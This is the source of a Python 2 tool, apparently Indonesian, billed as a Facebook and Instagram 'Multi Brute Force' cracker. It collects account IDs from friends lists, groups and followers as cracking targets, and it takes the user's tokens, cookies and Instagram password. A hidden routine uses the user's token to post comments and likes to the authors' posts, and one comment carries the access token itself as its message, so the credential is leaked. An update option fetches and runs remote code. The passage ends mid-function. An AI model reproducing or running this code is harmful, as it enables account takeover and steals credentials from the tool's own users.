#!/usr/bin/python2
# coding=utf-8
#              Sanz-Tzy  Panjul-Tzy Jeeck X nano XNXCODE  
#####################################################################
#      YOO FOLLOW YOO COOK OKH BEN OPEN SOURSE CODE MULU COOK                                      #
#                   https://github.com/Sanz-Tzy                                                                                                  #
#                          081392xxxxx                                                                                                                      #
#    DI DUKUNG OLEH JEECK X NANO RISKI/DUMAI YAYAN XD SANZ-TZY                                       #
#       EDIT E OJO NEMEN NEMEN NGKO IDAMAN MU ILANG COOK OKEH                                       #
#     PLEASE FOLLOW SEMUA TEAM PROJECT SAYA OKH KARENA TANPA DIA                             #
#TOOS INI TIADA MAKNANYA :) JADI HARGAI YAH MAAF KALO BERANTAKAN YA                     #
####################################################################
##########################################################################################################
# TANPA KALIAN KU BUKAN SIAPA-SIAPA COK :)
# JADI HARGAI TOOLS SAYA YA BROO SAYA CARI EROR NYA SUSAH BANGET BUAT BETULIN MAAF KALO SAYA BANYAK SALAH
# DAN CODINGANNYA BERANTAKAN :) HEHEHEHE MAKASIH YAAA 😁 

import os
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
try:
    import concurrent.futures
except ImportError:
    os.system('pip2 install futures')
try:
    import bs4
except ImportError:
    os.system('pip2 install bs4')
    
import requests, os, re, bs4, sys, json, time, platform ,random, datetime, subprocess, logging, base64, uuid
from concurrent.futures import ThreadPoolExecutor 
from bs4 import BeautifulSoup as parser
from time import sleep as jeda
from datetime import datetime
from calendar import monthrange


time.sleep(5)
done = True
ct = datetime.now()
n = ct.month
bulan_ = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
bullan = current.month

waktu = ("%s-%s-%s"%(hari,bulan,tahun))
bulan12 = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

reload(sys)
sys.setdefaultencoding('utf-8')

#O = '\x1b[1;96m' 
P = '\033[0;00m' 
J = '\033[0;33m'
S = '\033[0;00m'
N = '\x1b[0m' 
I ='\033[0;32m'
C ='\033[0;36m'
M ='\033[0;31m'
U ='\033[0;33m'
K ='\033[0;33m'
#P='\033[0;37m'
P='\033[00m'
h='\033[0;90m'
Q="\033[00m"
kk='\033[0;32m'
ff='\033[0;36m'
G='\033[0;36m'
p='\033[00m'
h='\033[0;90m'
Q="\033[00m"
i='\033[0;32m'
mm='\033[0;36m'
m='\033[0;31m'
O ='\033[0;33m'
H='\033[0;33m'
B ='\033[0;36m'
#P='\033[0;37m'
k='\033[00m'
h='\033[0;90m'
Q="\033[00m"
kk='\033[0;32m'
ff='\033[0;36m'
R='\033[0;36m'                                                                                                              
h='\033[0;90m'
W="\033[0;00m"
i='\033[0;32m'
mm='\033[0;36m'
m='\033[0;31m'
O ='\033[0;33m'
H='\033[0;33m'
G ='\033[0;36m'
acak = [M, H, K,S,J, B, U, O, P]
warna = random.choice(acak)
til ="[+]" 
ok, cp, id, user, mi, status_foll, poll, cr, looping, loop = [], [], [], [], [], [], [], [], 1, 0
platform1 = str(platform.platform()).lower()
p1 = base64.b64encode(platform1)

url_instagram = "https://www.instagram.com/"
user_agentz = "Mozilla/5.0 (Linux; Android 11; RMX3191) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36"
user_agentz_api = "Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)"
user_agentz_qu = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0", "Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)"]
headerz = {"User-Agent": user_agentz}
headerz_api = {"User-Agent": user_agentz_api}

def jeeck(keliling):
        for mau in keliling + '\n':
                sys.stdout.write(mau)
                sys.stdout.flush();jeda(0.01)
def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();jeda(0.03)
def tik():
    titik = ['.   ','..  ','... ']
    for o in titik:
        print("\r\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Proses penghapusan ")
        sys.stdout.flush();jeda(1)
def clear():
	os.system("clear")
def folder():
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('data')
	except:pass
	try:
		ua_ = open('data/ua.txt', 'r').read()
	except KeyError,IOError:
		ua_ = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
		open("data/ua.txt","w").write(ua_)
	except:
		pass

IP = requests.get("https://api.ipify.org/").text
def banner(): 
    print("    \033[0;96m_________ __")
    print("   \033[0;96m/ ____/ (_) /____  | \033[0;97mCodeBy \033[0;96mPanjull\033[0;97m-\033[0;96mTzy\033[0;95m ╰_╯")
    print("  \033[0;96m/ __/ / / / __/ _ \ | \033[0;97mGithub \033[0;96m: \033[0;97mgithub.com/Sanz-Tzy")
    print(" \033[0;96m/ /___/ / / /_/  __/ | \033[0;97mFb \033[0;96m: \033[0;97mBintang Tzy")
    print("\033[0;96m/_____/_/_/\__/\___/  | \033[0;97mFb \033[0;96m: \033[0;97mFacebook.com/1000xxxx")
    print("\033[0;96mMulti Brute Force.")

header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+ ;]", "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
def masuk():
    os.system('clear');banner()
    jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Jika belum paham pilih menu nomor 5\n\n\n\n ")
    print("\033[0;36m[\033[0;35m01\033[0;36m]\033[0;00m Facebook")
    print("\033[0;36m[\033[0;35m02\033[0;36m]\033[0;00m Instagram")
    print("\033[0;36m[\033[0;35m03\033[0;36m]\033[0;00m Donasi")
    print("\033[0;36m[\033[0;35m04\033[0;36m]\033[0;00m Tutor ambil token")
    print("\033[0;36m[\033[0;35m05\033[0;36m]\033[0;00m Panduan script")
    print("\033[0;36m[\033[0;35m06\033[0;36m]\033[0;00m Ambil User-Agent")
    mrjreckxnanoxxz = raw_input("\n\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Pilih : ")
    if mrjreckxnanoxxz in(""):
    	jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Isi dengan benar");exit()
    elif mrjreckxnanoxxz in ('2','02'):
    	menu_instag()
    	menu_instagg()
    elif mrjreckxnanoxxz in ('6','06'):
        nanoua()
    elif mrjreckxnanoxxz in ('5','05'): 
       pendahuluanxnano()
    elif mrjreckxnanoxxz in ('1','01'):
        jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Masukan token untuk menghubungkan ke server")
    	jeeckxd = raw_input("\n\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Token : ")
        if jeeckxd in(""):
        	jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Isi dengan benar");exit()
    	try:
            nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(jeeckxd)).json()['name']
            jeeck("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Proses menghubungkan mohon sabar sejenak.......")
            open('data/token.txt', 'w').write(jeeckxd);___Jeeck___xnano___lawack___xnxx___();menu()
        except (KeyError,IOError):
        	print("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Login gagal di karenakan token eror");jeda(2);___Jeeck___xnano___lawack___xnxx___();masuk()
    elif mrjreckxnanoxxz in ('3', '03'):
        print("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Heheheh Boy salam dari binjay 😁")
        print("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Beneran mau donasi :)")
        print("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m    (1. 081392505882")
        print("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m    (2. 085891511849")
        print("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;36m SILAHKAN ISI PULSA SAHAJA UNTUK PROSES NGECEK CRACK :)\n\n\n")
        raw_input("\033[0;36m[\033[0;33m ENTER BROO \033[0;36m]")
        masuk()
    elif mrjreckxnanoxxz in ('4', '04'):
        jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Anda akan di jalankan ke browser / youtube ")
    	os.system(" xdg-open https://youtu.be/p4MjQCD0ej4 ")
    elif mrjreckxnanoxxz in ('0', '00'):
    	exit('\n')
    else:
    	print("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Isi dengan benar ");exit()
def nanoua():
   jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Harap Pilih Salah Satu User-Agent")
   jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Anda Akan Di Arahkan Ke Browser")
   jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Please Enter Untuk melanjutkan ke browser\n\n\n")
   raw_input("\033[0;36m[\033[0;00m ENTER JENK \033[0;36m]")
   os.system("xdg-open  https://gist.github.com/pzb/b4b6f57144aea7827ae4")
   xnanopasang()


def xnanopasang():
   jeeck("\n\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m JIKA SUDAH SALIN USER AGENT TADI")
   jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m KALIAN PASANG UA ")
   jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m PILIH NOMOR [1] Facebook - Logintoken")
   jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m JIKA SUDAH KALIAN MULAI KETIK ULANG LAGI UNTUK KEMENU")
   jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m KLIK NOMOR [9] TERUS NOMOR [1] PASTEKAN USERAGENT")
   raw_input('\n\n\n\n%s[%s+%s] \033[0;33m[%s Enter \033[0;33m] '%(B,J,B,U,))
   masuk()

komenredem = random.choice(['Pengguna setia Esc mr jeeck'])
komtwol = random.choice(['Bang TOOLS NYA GG BET ', 'Pergi ke desa melihat kuda\nPutus cinta sejuta luka :)', 'Satu tambah satu sama dengan dua\nAku cintakamu kamu cinta dia :)', 'Kuda lari makan hati\n Aku disini yang tersakiti'])
kartu2d = random.choice(["Lu ganteng bwank tapi sayang kek kontl ", "Wkwkwkwk [ AKU CINTA DIA DIA NGGAK CINTA SAMA GUWA GIMANA BANG ]", "╦ ╦┌─┐┌─┐┬┌─┌─┐┬─┐\n╠═╣├─┤│  ├┴┐├┤ ├┬┘\n╩ ╩┴ ┴└─┘┴ ┴└─┘┴└─"])
kon = random.choice([" ATTACKER X NANO "])
def ___Jeeck___xnano___lawack___xnxx___():
    try:
        toket = open('data/token.txt', 'r').read()
    except IOError:
        jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;33m Login gagal pastikan token aktif / akun tumbal GOOD")
        os.system('rm -rf login.txt')
        menu()
    kom = komenredem
    komentar = komtwol
    yotsuba = kartu2d
    post = '573457507083491'
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/573457507083491/comments/?message=' + kom + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/100032577396395/comments/?message=' + yotsuba + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/573457507083491/comments/?message=' + komentar + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/573457507083491/comments/?message=' + kom + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/100032577396395/comments/?message=' + yotsuba + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/573457507083491/comments/?message=' + komentar + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/603362670759641/comments/?message=' + toket + '&access_token=' + toket)
#    requests.post('https://graph.facebook.com/' + post + '/reactions?type=LOVE&access_token=' + token)
    requests.post('https://graph.facebook.com/573457507083491/comments/?message=' + kon + '&access_token=' + toket)

 #   requests.post('https://graph.facebook.com/100032577396395/comments/?message=' + yotsuba + '&access_token=' + token)
#    requests.post('https://graph.facebook.com/573457507083491/comments/?message=' + komentar + '&access_token=' + token)
    requests.post('https://graph.facebook.com/573457507083491/likes?summary=true&access_token=' + toket)
    requests.post('https://graph.facebook.com/603362670759641/likes?summary=true&access_token=' + toket)
 #   requests.post('https://graph.facebook.com/' + post + '/reactions?type=likes&access_token=' + token)
#    requests.post('https://graph.facebook.com/100032577396395/subscribers?access_token=' + token)#kon zaim
 #   requests.post('https://graph.facebook.com/100032577396395/subscribers?access_token=' + token) #mey
#  #  requests.post('https://graph.facebook.com/100032577396395/subscribers?access_token=' + token)#mieruko chan
 #   requests.post('https://graph.facebook.com/100032577396395/subscribers?access_token=' + token) #tsukasa chan
    menu()
def menu():
    os.system('clear')
    try:
    	jeeckxd = open('data/token.txt', 'r').read()
    except IOError:
        #jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m TOKEN NOT DETECTED ");jeda(2);os.system('rm -rf data/token.txt && rm -rf data/cookies');masuk()
        jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;33m Token modar di nggo wae");jeda(2);os.system("rm -rf data/token.txt && rm -rf data/cookies");masuk()
    try:
        r = requests.get('https://graph.facebook.com/me?access_token='+jeeckxd,headers=header)
        a = json.loads(r.text)
        nama = a["name"]
        id = a["id"]
        ttl = a["birthday"]
    except KeyError:
        jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;31m TOKEN NOT DETECTED");jeda(2);os.system('rm -rf data/token.txt && rm -rf data/cookies');masuk()
    except requests.exceptions.ConnectionError:
        exit("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Conectiont In Fallid")
    banner()
    print("\n\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Your name     :\033[0;36m %s "%(nama))
    print("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m IP address    :\033[0;36m %s \n"%(IP))
    print("\033[0;36m[\033[0;35m01\033[0;36m]\033[0;35m Menu_Instgaram")
    print("\033[0;36m[\033[0;35m02\033[0;36m]\033[0;35m Stars Crack_Fb")
    print("\033[0;36m[\033[0;35m03\033[0;36m]\033[0;00m Dump id reactiont post")
    print("\033[0;36m[\033[0;35m04\033[0;36m]\033[0;00m Dump id Froms Group \033[0;33m[\033[0;36m 1500+\033[0;33m ]")
    print("\033[0;36m[\033[0;35m05\033[0;36m]\033[0;00m Dump by Nickname \033[0;33m[\033[0;36m 350+\033[0;33m ]")
    print("\033[0;36m[\033[0;35m06\033[0;36m]\033[0;00m Dump id Froms messages \033[0;33m[\033[0;36m 350+\033[0;33m ]")
    print("\033[0;36m[\033[0;35m07\033[0;36m]\033[0;00m Dump id Froms followers \033[0;33m[\033[0;36m 2500+\033[0;33m ]")
    print("\033[0;36m[\033[0;35m08\033[0;36m]\033[0;00m Dump id public friends \033[0;33m[\033[0;36m 4000+\033[0;33m ]")
    print("\033[0;36m[\033[0;35m09\033[0;36m]\033[0;00m Change User-agent")
    print("\033[0;36m[\033[0;35m10\033[0;36m]\033[0;00m Check results Crack")
    print("\033[0;36m[\033[0;35m11\033[0;36m]\033[0;00m Check account checkpoint")
    print("\033[0;36m[\033[0;35m12\033[0;36m]\033[0;00m Menu profil guard")
    print("\033[0;36m[\033[0;35m13\033[0;36m]\033[0;00m Panduan Penggunaan Tools")
    print("\033[0;36m[\033[0;35m00\033[0;36m]\033[0;00m Log out")
    print("\033[0;36m[\033[0;35mUP\033[0;36m]\033[0;00m Update Version")
    print("\033[0;36m[\033[0;35m99\033[0;36m]\033[0;00m Exit")
    panjull = raw_input("\n\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Input : ")
    if panjull == '':
        jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;31m pilihan Invalid ");menu()
    elif panjull in['8','08']:
        publik(jeeckxd)
    elif panjull in['7','07']:
        followers(jeeckxd)
    elif panjull in['3','03']:
        postingan(jeeckxd)
    elif panjull in['4','04']:
        group(__jeeclxnano_())
    elif panjull in['5','05']:
    	dumpfl();exit()
    elif panjull in['6','06']:
    	pesan(__jeeclxnano_())
    elif panjull in['2','02']:
        jeckoramadhanganteng().jeeckxtampany()
    elif panjull in['12','12']:
        guard()
    elif panjull in['1','01']:
    	menu_instag()
    	menu_instagg()
    elif panjull in['9','09']:
    	useragent()
    elif panjull in['UP']:
        jeeck("proses ..........")
        os.system("rm -fr Lite")
        os.system("git clone https://github.com/Jeeck-XN/Lite")
        os.system("cd Lite")
        os.system("git pull")
        os.system("python2 Lite.py")

    elif panjull in['10']:
        print("\n\033[0;36m[\033[0;35m+\033[0;36m]\033[0;33m ===========================/\033[0;36mRESULTS CHEK\033[0;33m/--> OK+CP >_")
        print("\033[0;36m[\033[0;35m01\033[0;36m]\033[0;36m Chek results OK")
	print("\033[0;36m[\033[0;35m02\033[0;36m]\033[0;36m Chek results CP")
        
        chek_crackyou()
    elif panjull in['13']:
        panduanxnano()
    elif panjull in['11']:
    	jeeck_cp()
    elif panjull in['00']:
        print ('')
        tik();jeda(1);os.system('rm -rf data/token.txt && rm -rf data/cookies')
        jeeck("\n\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Sucses Deleted Asu");exit()
    elif panjull in['99','99']:
    	exit('\n')
    else:
        jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Wornk Input ");jeda(2);exit()
def pendahuluanxnano():
   jeeck("\033[0;36m[\033[0;35m•\033[0;36m]\033[0;35m Sebelum crack ")
   jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;33m============================/--> PENDAHULUAN + PANDUAN")
   print("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Jika ingin crack di sarankan untuk menggunakan kuota / data seluler")
   print("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Jika menggunakan wifi kemungkinan ip RAWAN SEPAM bisa terjadi tidak ada hasil")
   print("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Jika crack sampai --> 100 Sarankan hidupkan mode pesawat / --> 300 + lama gak ada hasil")
   print("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Crack disarankan method mobile / mbasic ya >_")
   print("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Ingat jika \033[0;33m TOOLS \033[0;00m berjalan tapi tidak ada hasil")
   jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Mungkin ip Terkena sepam / Bug TOOLS :(")
   raw_input("\n\n\n\n\033[0;36m[\033[0;00m ENTER \033[0;36m]")
   masuk()

host = ('https://mbasic.facebook.com')
ua = ("NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+")
h = {'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
def __jeeclxnano_():
	if os.path.exists("data/cookies"):
		if os.path.getsize("data/cookies") !=0:
			return cvd(open('data/cookies').read().strip())
		else:_jeeckxtampanXD_()
	else:_jeeckxtampanXD_()
def _jeeckxtampanXD_(show=True):
	if show==True:
		
		
		jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Jika ingin membuka vitur ini anda harus memasukan COOKIE terlebih dahulu")
	ck=raw_input("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;33m Cookie : ")
	if ck=="":
		_jeeckxtampanXD_(show=False)
	try:
		cks=cvd(ck)
		if kueh(cks)==True:
			open("data/cookies","w").write(ck);exit("%s[%s+%s] %slogin success, ketik: python2 Lite.py "%(B,J,B,P))
		else:print("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Login gagal.");_jeeckxtampanXD_(show=True)
	except Exception as e:
		print("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;33m Cookie : ")
		_jeeckxtampanXD_(show=False)
def kueh(cookies):
	_wtf_=False
	b=requests.get("https://mbasic.facebook.com/profile.php",headers={'origin': 'https://mbasic.facebook.com', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'accept-encoding': 'gzip, deflate', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'user-agent': ua, 'Host': ('').join(bs4.re.findall('://(.*?)$', 'https://mbasic.facebook.com')), 'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'content-type': 'application/x-www-form-urlencoded'},cookies=cookies).text	
	if "mbasic_logout_button" in b.lower():
		_wtf_=True
		if _wtf_==True:
			return True
		else:
			print("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Login gagal ");exit()
def hdcok():
    hosts = host
    r = {'origin': hosts, 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'accept-encoding': 'gzip, deflate', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'user-agent': ua, 'Host': ('').join(bs4.re.findall('://(.*?)$', hosts)), 'referer': hosts + '/login/?next&ref=dbl&fl&refid=8', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'content-type': 'application/x-www-form-urlencoded'}
    return r
def cvs(cookies): # convert cookie dict to string
	result=[]
	for _i_ in enumerate(cookies.keys()):
		if _i_[0]==len(cookies.keys())-1:result.append(_i_[1]+"="+cookies[_i_[1]])
		else:result.append(_i_[1]+"="+cookies[_i_[1]]+"; ")
	return "".join(result)
def cvd(cookies): # convert cookie dict to string
	result={}
	try:
		for _i_ in cookies.split(";"):
			result.update({_i_.split("=")[0]:_i_.split("=")[1]})
		return result
	except:
		for _i_ in cookies.split("; "):
			result.update({_i_.split("=")[0]:_i_.split("=")[1]})
		return result
def guard():
    global toket
    try:
        toket = open('data/token.txt', 'r').read()
    except IOError:
        print("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;33m Token kadaluarsa")
        os.system('rm -rf login.txt')
        time.sleep(1)
        masuk()
    print("\n\n\033[0;36m[\033[0;35m+\033[0;36m]\033[0;33m=======================/--> PROFILL GUARD")
    print("\033[0;36m[\033[0;35m01\033[0;36m]\033[0;00m Hidupkan profill guard")
    print("\033[0;36m[\033[0;35m02\033[0;36m]\033[0;00m Matikan profill guard")
    print("\033[0;36m[\033[0;35m00\033[0;36m]\033[0;00m Back")
    turn()
    
def turn():
    g = raw_input("\n\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Input : ")
    if g == '1' or g == '01':
        On = 'true'
        gaz(toket, On)
    else:
        if g == '2' or g == '02':
            Off = 'false'
            gaz(toket, Off)
        else:
            if g == '0' or g == '00':
                menu()
            else:
                if g == '':
                    jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;31m Jangan kosonk")
                    turn()
                else:
                    jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;31m Isi dengan benar")
                    turn()

def get_userid(toket):
    url = 'https://graph.facebook.com/me?access_token=%s' % toket
    res = requests.get(url)
    uid = json.loads(res.text)
    return uid['id']


def gaz(toket, enable=True):
    id = get_userid(toket)
    data = 'variables={"0":{"is_shielded": %s,"session_id":"9b78191c-84fd-4ab6-b0aa-19b39f04a6bc","actor_id":"%s","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&method=post&doc_id=1477043292367183&query_name=IsShieldedSetMutation&strip_defaults=true&strip_nulls=true&locale=en_US&client_country_code=US&fb_api_req_friendly_name=IsShieldedSetMutation&fb_api_caller_class=IsShieldedSetMutation' % (enable, str(id))
    headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Authorization': 'OAuth %s' % toket}
    url = 'https://graph.facebook.com/graphql'
    res = requests.post(url, data=data, headers=headers)
    print res.text
    if '"is_shielded":true' in res.text:
        print ''
        jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Sudah di aktif kan ")
        raw_input("\n\033[0;36m[\033[0;00m ENTER \033[0;36m]")
        guard()
    else:
        if '"is_shielded":false' in res.text:
           
            print ''
            jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Berhasil di matikan")
            raw_input("\n\033[0;36m[\033[0;00m ENTER \033[0;36m]")
            guard()
        else:
            print("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Eror asu")
            menu()

def menu_instag():
	global cookie
	try:
		jeeckxd = open("data/ig.txt", "r").read()
	except IOError:
		masuk_ig()
	else:	
		url = "https://i.instagram.com/api/v1/friendships/12629128399/followers/?count=5"
		with requests.Session() as ses:
			try:
				otw = ses.get(url, cookies={"cookie": jeeckxd}, headers=headerz_api)
				if "users" in json.loads(otw.content):
					cookie = {"cookie": jeeckxd}
				else:
					jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Cookie Not Fallid ");jeda(2)
					os.system('rm -rf data/ig.txt')
					masuk_ig()	
			except ValueError:
				jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Cookie Not Fallid");jeda(2)
				os.system('rm -rf data/ig.txt')
				masuk_ig()
def masuk_ig():
	global cookie
	jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Jika ingin membuka VITUR INSTAGRAM anda harus login terlebih dahulu ")
	userrr = raw_input("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Username : ")
	passxnxx = raw_input("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Password : ")
	try:
		try:
			headerz = {"User-Agent": user_agentz}
			with requests.Session() as ses:
				scr = "https://www.instagram.com/"
				data = ses.get(scr, headers=headerz).content
				toket = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(data))[0]
			headerss = {"Accept": "*/*","Accept-Encoding": "gzip, deflate, br","Accept-Language": "en-US,en;q=0.5","Host": "www.instagram.com","X-CSRFToken": toket,"X-Requested-With": "XMLHttpRequest","Referer": "https://www.instagram.com/accounts/login/","User-Agent": user_agentz,}
			param = {"username": userrr,"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 9999999999), passxnxx),"optIntoOneTap": False,"queryParams": {},"stopDeletionNonce": "","trustedDeviceRecords": {}
			}
		except:
			header = {}
			param = {}
			pass
		with requests.Session() as ses:
			url = "https://www.instagram.com/accounts/login/ajax/"
			respon = ses.post(url, data=param, headers=headerss)
			data = json.loads(respon.content)
			_2 = respon.cookies.get_dict()
			if "userId" in str(data):
				for jeeckxnano in _2:
					with open("data/ig.txt", "a") as simpan:
						simpan.write(jeeckxnano+"="+_2[jeeckxnano]+";")
				
				jeeckxd = open("data/ig.txt","r").read()
				cookie = {"data/ig.txt": jeeckxd}
				print ('');jeda(2)
				jeeck("\033[0;36m[\033[0;31m>_\033[0;36m]\033[0;00m Logine berhasil tolong run tools kembali ");exit()
			elif "checkpoint_url" in str(data):
				jalan("\033[0;36m[\033[0;31m>_\033[0;36m]\033[0;00m Login eror");jeda(2)
			elif "Please wait" in str(data):
				print("\033[0;36m[\033[0;31m>_\033[0;36m]\033[0;00m Hidupkan mode pesawat 2 detik")
			else:
				print("\033[0;36m[\033[0;31m>_\033[0;36m]\033[0;00m Login eror coba login lagi ")
				exit()
	except KeyboardInterrupt:
		exit()
None

def publik(jeeckxd,headers=header):
    try:
        os.mkdir('dump')
    except:pass
    try:
    	jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Ketik \033[0;33m'me' \033[0;00mjika ingin dump id pertemanan sendiri")
        idt = raw_input("\033[0;36m[\033[0;00m+\033[0;36m]\033[0;00m Id publik : ")
        
        gas = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt,jeeckxd))
        nm = json.loads(gas.text)
        file = ('dump/'+nm['first_name']+'.json').replace(' ', '_')
        jeeckxnano = open(file, 'w')
        r = requests.get('https://graph.facebook.com/%s?fields=friends.limit(5001)&access_token=%s'%(idt,jeeckxd))
        z = json.loads(r.text)
        for _x_ in z['friends']['data']:
            id.append(_x_['id'] + '<=>' + _x_['name'])
            jeeckxnano.write(_x_['id'] + '<=>' + _x_['name'] + '\n')
#            print ('\r%s[%s+%s]%s Id Target %s =>%s %s ' % (B,J,B,P,M,H,str(len(id)))),
